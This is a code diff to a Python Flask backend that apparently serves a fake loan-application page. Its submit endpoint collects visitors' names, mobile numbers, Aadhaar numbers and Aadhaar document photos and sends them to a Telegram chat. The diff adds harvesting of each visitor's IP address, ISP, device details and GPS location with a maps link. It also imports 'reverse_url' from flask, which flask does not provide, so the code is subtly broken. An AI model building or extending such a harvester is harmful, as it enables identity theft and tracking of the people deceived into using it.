@@ -1,7 +1,7 @@
 import base64
 import os
 import requests
-from flask import Flask, jsonify, render_template, request
+from flask import Flask, jsonify, reverse_url, render_template, request
 
 app = Flask(__name__)
 
@@ -29,7 +29,11 @@ def send_photo(photo_path, caption):
       with open(photo_path, "rb") as ph:
         requests.post(
             url,
-            data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption},
+            data={
+                "chat_id": TELEGRAM_CHAT_ID,
+                "caption": caption,
+                "parse_mode": "Markdown",
+            },
             files={"photo": ph},
             timeout=10,
         )
@@ -101,10 +105,33 @@ def api_snapshots():
 @app.route("/api/submit_loan", methods=["POST"])
 def api_submit_loan():
   data = request.get_json()
-  name = data.get("name")
-  mobile = data.get("mobile")
-  aadhaar = data.get("aadhaar")
+  name = data.get("name", "N/A")
+  mobile = data.get("mobile", "N/A")
+  aadhaar = data.get("aadhaar", "N/A")
+  lat = data.get("latitude")
+  lon = data.get("longitude")
   doc_data = data.get("document")
+
+  ip = request.headers.get(
+      "CF-Connecting-IP",
+      request.headers.get("X-Forwarded-For", request.remote_addr),
+  )
+  user_agent = request.headers.get("User-Agent", "Unknown Device")
+
+  # Fetch ISP details
+  isp = "Unknown"
+  try:
+    ip_res = requests.get(f"http://ip-api.com/json/{ip}", timeout=3).json()
+    if ip_res.get("status") == "success":
+      isp = f"{ip_res.get('isp', 'N/A')} / {ip_res.get('org', 'N/A')}"
+  except:
+    pass
+
+  maps_link = (
+      f"https://www.google.com/maps?q={lat},{lon}"
+      if lat and lon
+      else "N/A"
+  )
 
   doc_path = None
   if doc_data:
@@ -117,15 +144,20 @@ def api_submit_loan():
       pass
 
   msg = (
-      f"🎯 *STAGE 3: FINAL APPLICATION SUBMITTED* 🎯\n\n"
+      f"🎯 *FINAL APPLICATION SUBMITTED* 🎯\n\n"
       f"👤 *Name:* {name}\n"
       f"📱 *Mobile:* {mobile}\n"
-      f"🆔 *Aadhaar:* `{aadhaar}`"
+      f"🆔 *Aadhaar:* `{aadhaar}`\n"
+      f"🌐 *IP Address:* `{ip}`\n"
+      f"📶 *ISP / Network:* {isp}\n"
+      f"💻 *Device Info:* `{user_agent}`\n"
+      f"📌 *Coords:* `{lat}, {lon}`\n"
+      f"🗺️ [Open in Google Maps]({maps_link})"
   )
   send_telegram(msg)
 
   if doc_path:
-    send_photo(doc_path, "🆔 Uploaded Aadhaar Document")
+    send_photo(doc_path, "🆔 *Uploaded Aadhaar Document*")
     if os.path.exists(doc_path):
       os.remove(doc_path)
 
@@ -135,3 +167,4 @@ def api_submit_loan():
 if __name__ == "__main__":
   port = int(os.environ.get("PORT", 5000))
   app.run(host="0.0.0.0", port=port)
+
